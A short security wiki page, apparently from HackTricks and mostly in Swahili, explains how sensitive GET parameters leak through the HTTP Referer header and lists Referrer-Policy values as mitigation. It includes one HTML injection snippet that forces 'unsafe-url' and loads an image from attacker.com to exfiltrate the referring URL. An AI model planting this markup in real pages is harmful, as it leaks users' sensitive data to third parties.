# Interesting HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer headers and policy

Referrer ni header inayotumiwa na browsers kuonyesha ni ukurasa gani uliotembelewa awali.

### Taarifa nyeti leaked

Ikiwa wakati fulani ndani ya ukurasa wa wavuti kuna taarifa nyeti kwenye parameters za GET request, ikiwa ukurasa una links zinazoelekeza kwenye vyanzo vya nje au attacker anaweza kumfanya/kumshauri (social engineering) mtumiaji kutembelea URL inayodhibitiwa na attacker. Anaweza ku-exfiltrate taarifa nyeti zilizo ndani ya GET request ya mwisho.

### Mitigation

Unaweza kuifanya browser ifuate **Referrer-policy** ambayo inaweza **kuzuia** taarifa nyeti kutumwa kwenye web applications nyingine:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Kupinga Mitigation

Unaweza kubatilisha sheria hii kwa kutumia HTML meta tag (mshambuliaji anahitaji kutumia HTML injection):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Ulinzi

Usiweke kamwe data yoyote nyeti ndani ya GET parameters au paths katika URL.

{{#include ../banners/hacktricks-training.md}}
